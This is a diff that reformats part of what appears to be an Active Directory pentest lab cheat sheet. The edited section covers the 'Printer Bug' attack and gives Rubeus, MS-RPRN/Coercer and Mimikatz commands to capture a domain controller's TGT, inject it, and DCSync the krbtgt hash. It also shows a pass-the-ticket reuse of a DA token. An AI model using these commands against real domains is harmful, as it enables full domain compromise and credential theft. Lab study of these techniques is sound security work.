@@ -1967,13 +1967,14 @@ Compromise the server(s) where Unconstrained Delegation is enabled
 - The DA token could be reused
   - `Invoke-Mimikatz -Command '"kerberos::ptt C:\Path\To\Your\Kirbi\File.kirbi"'`
  
-Printer Bug
-- We can capture the TGT of <domain-controller>$ by using Rubeus on domain-appsrv:
+**Printer Bug**
+- We can capture the TGT of `<domain-controller>$` by using Rubeus on domain-appsrv
   - `Rubeus.exe monitor /interval:5 /nowrap`
-- And after that run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) on the student VM:
+- And after that run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) on the student VM
   - `MS-RPRN.exe \\<DC_hostname> \\<App_server_hostname>`
-- For Linux: [Coercer](https://github.com/p0dalirius/Coercer)
-- Copy the base64 encoded TGT, remove extra spaces and use it on the windows machine: `Rubeus.exe ptt /tikcet:`
+- For Linux, use [Coercer](https://github.com/p0dalirius/Coercer)
+- Copy the base64 encoded TGT, remove extra spaces and use it on the windows machine
+  - `Rubeus.exe ptt /tikcet:`
 - Once the ticket is injected, run DCSync:
   - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'`
 
